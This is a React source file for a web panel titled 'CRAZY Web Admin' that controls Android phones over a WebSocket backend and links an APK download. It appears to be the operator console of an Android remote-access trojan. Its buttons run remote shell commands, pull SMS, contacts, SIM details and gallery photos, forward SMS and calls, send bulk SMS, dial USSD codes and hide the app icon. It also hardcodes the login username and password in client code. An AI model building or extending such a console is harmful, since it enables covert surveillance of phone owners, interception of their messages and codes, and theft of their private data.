"use client";
import { useState, useEffect, useRef } from 'react';

export default function Dashboard() {
  // --- AUTH STATE ---
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');

  // --- DASHBOARD STATE ---
  const [activeTab, setActiveTab] = useState('Home');
  const [devices, setDevices] = useState<any>({});
  const [selectedDevice, setSelectedDevice] = useState<string | null>(null);
  const [deviceSearch, setDeviceSearch] = useState('');
  
  // Advanced Features State
  const [searchQuery, setSearchQuery] = useState('');
  const [galleryImages, setGalleryImages] = useState<string[]>([]);
  const [galleryOffset, setGalleryOffset] = useState<number>(0);
  const [terminalCmd, setTerminalCmd] = useState('');
  const [terminalOut, setTerminalOut] = useState<string | null>(null);
  const [simInfo, setSimInfo] = useState<any>(null);
  const [rawData, setRawData] = useState<any>(null);
  const [inHookLogs, setInHookLogs] = useState<string[]>([]);
  const [messages, setMessages] = useState<any[]>([]);

  const ws = useRef<WebSocket | null>(null);

  // --- AUTHENTICATION ---
  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (username === 'R4RECOVERIST' && password === 'M4mahadev@3690') {
      setIsLoggedIn(true);
      setError('');
    } else {
      setError('Invalid Credentials');
    }
  };

  // --- WEBSOCKET ---
  useEffect(() => {
    if (!isLoggedIn) return;
    
    ws.current = new WebSocket('wss://onxy-backend.onrender.com/ws?role=admin');
    ws.current.onopen = () => console.log('Connected');
    ws.current.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        
        if (data.device_id) {
          setDevices((prev: any) => ({ ...prev, [data.device_id]: data }));
          if (!selectedDevice) setSelectedDevice(data.device_id);
          if (data.sms) setMessages(data.sms);
        }
        
        if (data.type === 'gallery_response') { setGalleryImages(prev => [...prev, ...data.images]); setGalleryOffset(data.offset); }
        if (data.type === 'shell_response') setTerminalOut(data.data);
        if (data.type === 'sim_info_response') setSimInfo(JSON.parse(data.data));
        if (data.type === 'sms_response' || data.type === 'contacts_response') setRawData(data.data);
        if (data.type === 'in_hook_log') setInHookLogs(prev => [data.log, ...prev]);
      } catch (e) {}
    };
    return () => ws.current?.close();
  }, [isLoggedIn, selectedDevice]);

  const sendCommand = (command: string, payload: any = {}) => {
    if (ws.current?.readyState === WebSocket.OPEN && selectedDevice) {
      ws.current.send(JSON.stringify({ target: selectedDevice, type: 'cmd', command, payload }));
    } else {
      alert("Device not selected or disconnected!");
    }
  };

  const dev = devices[selectedDevice || ''] || {};
  const filteredDevices = Object.values(devices).filter((d: any) => 
    d.device_id.toLowerCase().includes(deviceSearch.toLowerCase()) || 
    (d.model && d.model.toLowerCase().includes(deviceSearch.toLowerCase()))
  );
  const filteredMessages = messages.filter(msg => !searchQuery || (msg.body && msg.body.toLowerCase().includes(searchQuery.toLowerCase())));

  // --- LOGIN SCREEN ---
  if (!isLoggedIn) {
    return (
      <div className="min-h-screen bg-[#0B0C10] flex items-center justify-center p-4">
        <div className="bg-[#1A1B23] p-8 rounded-xl border border-gray-800 w-full max-w-md shadow-2xl">
          <h1 className="text-2xl font-bold text-purple-500 text-center mb-6">CRAZY Web Admin</h1>
          {error && <div className="bg-red-900/50 text-red-400 p-3 rounded mb-4 text-sm text-center border border-red-800">{error}</div>}
          <form onSubmit={handleLogin} className="space-y-4">
            <div>
              <label className="block text-sm text-gray-400 mb-1">Username</label>
              <input type="text" value={username} onChange={(e) => setUsername(e.target.value)} className="w-full bg-black border border-gray-700 rounded p-3 text-white focus:border-purple-500 outline-none" required />
            </div>
            <div>
              <label className="block text-sm text-gray-400 mb-1">Password</label>
              <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} className="w-full bg-black border border-gray-700 rounded p-3 text-white focus:border-purple-500 outline-none" required />
            </div>
            <button type="submit" className="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-3 rounded transition">Login</button>
          </form>
        </div>
      </div>
    );
  }

  // --- MAIN DASHBOARD UI ---
  return (
    <div className="min-h-screen bg-[#0B0C10] text-white font-sans flex flex-col">
      {/* Header */}
      <header className="flex justify-between items-center p-4 border-b border-gray-800 bg-[#1A1B23]">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-full bg-purple-600 flex items-center justify-center text-xl">👤</div>
          <div>
            <h1 className="font-bold text-lg text-purple-400">CRAZY</h1>
            <p className="text-xs text-gray-400">Web Admin</p>
          </div>
        </div>
        <div className="flex items-center gap-4">
          <a href="/crazy-onxy-MDM/app-debug.apk" download className="bg-purple-600 hover:bg-purple-700 text-white px-4 py-2 rounded-lg font-bold text-sm shadow-lg transition">
            ⬇ Download APK
          </a>
          <span className="text-xl cursor-pointer">⚙️</span>
          <span className="text-sm text-purple-400 border border-purple-500 px-3 py-1 rounded-full cursor-pointer hover:bg-purple-900 transition">Sessions</span>
          <span className="text-xl cursor-pointer">🌙</span>
        </div>
      </header>

      <div className="flex flex-1 overflow-hidden">
        {/* Sidebar: 500+ Device Manager */}
        <div className="w-80 bg-[#1A1B23] border-r border-gray-800 flex flex-col h-[calc(100vh-73px)]">
          <div className="p-4 border-b border-gray-800">
            <h2 className="text-lg font-bold text-purple-400 mb-2">Device Manager</h2>
            <p className="text-xs text-gray-400 mb-4">Connected: {Object.keys(devices).length}</p>
            <input type="text" placeholder="Search device ID or Model..." value={deviceSearch} onChange={(e) => setDeviceSearch(e.target.value)} className="bg-black border border-gray-700 rounded p-2 text-sm w-full text-white mb-2" />
          </div>
          <div className="flex-1 overflow-y-auto p-2 space-y-1">
            {filteredDevices.map((d: any) => (
              <button key={d.device_id} onClick={() => setSelectedDevice(d.device_id)} className={`w-full text-left p-3 rounded text-sm transition ${selectedDevice === d.device_id ? 'bg-purple-600' : 'hover:bg-gray-800'}`}>
                <div className="font-bold">{d.model || 'Device'}</div>
                <div className="text-xs text-gray-300">{d.device_id.slice(0,10)}...</div>
              </button>
            ))}
          </div>
        </div>

        {/* Main Content Area */}
        <div className="flex-1 flex flex-col h-[calc(100vh-73px)]">
          {selectedDevice ? (
            <>
              {/* Tabs Navigation */}
              <nav className="flex gap-4 p-4 border-b border-gray-800 text-sm overflow-x-auto bg-[#0B0C10]">
                {['Home', 'Messages', 'Gallery', 'SIM Control', 'Terminal', 'Data', 'In-Hook Logs'].map(tab => (
                  <button key={tab} onClick={() => setActiveTab(tab)} className={`pb-2 whitespace-nowrap px-2 ${activeTab === tab ? 'border-b-2 border-purple-500 text-white font-bold' : 'text-gray-400'}`}>{tab}</button>
                ))}
              </nav>

              {/* Tab Content */}
              <main className="p-6 overflow-y-auto flex-1">
                
                {/* HOME TAB */}
                {activeTab === 'Home' && (
                  <>
                    <div className="bg-[#1A1B23] p-5 rounded-xl border border-gray-800 mb-6">
                      <div className="flex justify-between items-start mb-4">
                        <h2 className="text-xl font-bold">{dev.model || 'Device'} <span className="text-xs bg-green-800 text-green-300 px-2 py-1 rounded ml-2">Online</span></h2>
                      </div>
                      <div className="grid grid-cols-2 gap-y-3 text-sm text-gray-300">
                        <div className="flex justify-between pr-4"><span>ID</span> <span className="text-white">{selectedDevice}</span></div>
                        <div className="flex justify-between pr-4"><span>IP Address</span> <span className="text-blue-400">{dev.ip || 'N/A'}</span></div>
                      </div>
                    </div>

                    <div className="grid grid-cols-2 md:grid-cols-4 gap-3 mb-6">
                      {[
                        { label: 'Check Online', icon: '📡', cmd: 'CHECK_ONLINE' },
                        { label: 'GET SMS', icon: '📥', cmd: 'GET_SMS' },
                        { label: 'Bulk SMS', icon: '✉️', cmd: 'BULK_SMS' },
                        { label: 'Send SMS', icon: '📤', cmd: 'SEND_SMS' },
                        { label: 'SMS Forward', icon: '🔄', cmd: 'SMS_FORWARD' },
                        { label: 'Call Forward', icon: '📞', cmd: 'CALL_FORWARD' },
                        { label: 'Dial USSD', icon: '🔢', cmd: 'DIAL_USSD' },
                        { label: 'Hide Icon', icon: '🕵️', cmd: 'HIDE_ICON' }
                      ].map((btn, i) => (
                        <button key={i} onClick={() => sendCommand(btn.cmd)} className="bg-[#1A1B23] border border-gray-800 hover:border-purple-500 p-4 rounded-xl flex flex-col items-center justify-center gap-2 transition">
                          <span className="text-2xl">{btn.icon}</span>
                          <span className="text-xs font-semibold text-gray-300">{btn.label}</span>
                        </button>
                      ))}
                    </div>
                  </>
                )}

                {/* MESSAGES TAB */}
                {activeTab === 'Messages' && (
                  <div className="space-y-4">
                    <input type="text" placeholder="Search by 2 letters..." value={searchQuery} onChange={(e) => setSearchQuery(e.target.value)} className="bg-black border border-gray-700 rounded p-3 text-sm w-full text-white" />
                    <div className="space-y-2">
                      {filteredMessages.map((msg, idx) => (
                        <div key={idx} className="bg-[#1A1B23] p-4 rounded-xl border border-gray-800 text-sm">
                          <p className="text-purple-400 font-bold mb-1">{msg.address || 'Unknown'}</p>
                          <p className="text-gray-300">{msg.body}</p>
                        </div>
                      ))}
                    </div>
                  </div>
                )}

                {/* GALLERY TAB */}
                {activeTab === 'Gallery' && (
                  <div className="space-y-4">
                    <button onClick={() => { setGalleryImages([]); setGalleryOffset(0); sendCommand('GET_GALLERY', { limit: 500, offset: 0 }); }} className="bg-blue-600 hover:bg-blue-700 px-6 py-2 rounded-lg font-bold">Fetch First 500</button>
                    <div className="grid grid-cols-3 md:grid-cols-5 gap-2">{galleryImages.map((b64, i) => <img key={i} src={`data:image/jpeg;base64,${b64}`} className="w-full h-auto rounded object-cover" />)}</div>
                    {galleryImages.length > 0 && <button onClick={() => sendCommand('GET_GALLERY', { limit: 500, offset: galleryOffset })} className="w-full bg-gray-800 border border-gray-700 p-3 rounded text-sm text-white hover:bg-gray-700 mt-4">Load More</button>}
                  </div>
                )}

                {/* TERMINAL TAB */}
                {activeTab === 'Terminal' && (
                  <div className="bg-[#1A1B23] p-4 rounded-xl border border-gray-800">
                    <div className="flex gap-2 mb-4">
                      <input type="text" placeholder="e.g., pm list packages" value={terminalCmd} onChange={e => setTerminalCmd(e.target.value)} className="bg-black border border-gray-700 rounded p-3 w-full font-mono text-white" />
                      <button onClick={() => sendCommand('EXECUTE_SHELL', { command: terminalCmd })} className="bg-green-600 px-6 py-2 rounded font-bold">Run</button>
                    </div>
                    <pre className="bg-black p-4 rounded-lg border border-gray-700 text-green-400 text-sm overflow-x-auto min-h-[300px]">{terminalOut || 'Terminal ready...'}</pre>
                  </div>
                )}

                {/* SIM CONTROL TAB */}
                {activeTab === 'SIM Control' && (
                  <div className="space-y-4">
                    <div className="bg-[#1A1B23] p-4 rounded-xl border border-gray-800">
                      <button onClick={() => sendCommand('GET_SIM_INFO')} className="bg-blue-600 px-6 py-2 rounded mb-4">Fetch SIM Info</button>
                      <pre className="bg-black p-4 rounded text-sm text-gray-300">{simInfo ? JSON.stringify(simInfo, null, 2) : 'No Data'}</pre>
                    </div>
                  </div>
                )}

                {/* DATA TAB */}
                {activeTab === 'Data' && (
                  <div className="space-y-4">
                    <div className="flex gap-2">
                      <button onClick={() => sendCommand('GET_SMS')} className="bg-blue-600 px-4 py-2 rounded">Fetch SMS</button>
                      <button onClick={() => sendCommand('GET_CONTACTS')} className="bg-green-600 px-4 py-2 rounded">Fetch Contacts</button>
                    </div>
                    <pre className="bg-black p-4 rounded border border-gray-800 text-xs text-green-400 overflow-x-auto min-h-[300px]">{rawData ? JSON.stringify(rawData, null, 2) : 'No Data'}</pre>
                  </div>
                )}

                {/* IN-HOOK LOGS TAB */}
                {activeTab === 'In-Hook Logs' && (
                  <div className="bg-black p-4 rounded-xl border border-green-900 h-[500px] overflow-y-auto font-mono text-sm text-green-500">
                    {inHookLogs.length === 0 ? 'Waiting for AI Logs...' : inHookLogs.map((log, i) => <div key={i}>{log}</div>)}
                  </div>
                )}
              </main>
            </>
          ) : (
            <div className="flex-1 flex items-center justify-center text-gray-500">Select a device from the left menu.</div>
          )}
        </div>
      </div>
    </div>
  );
}
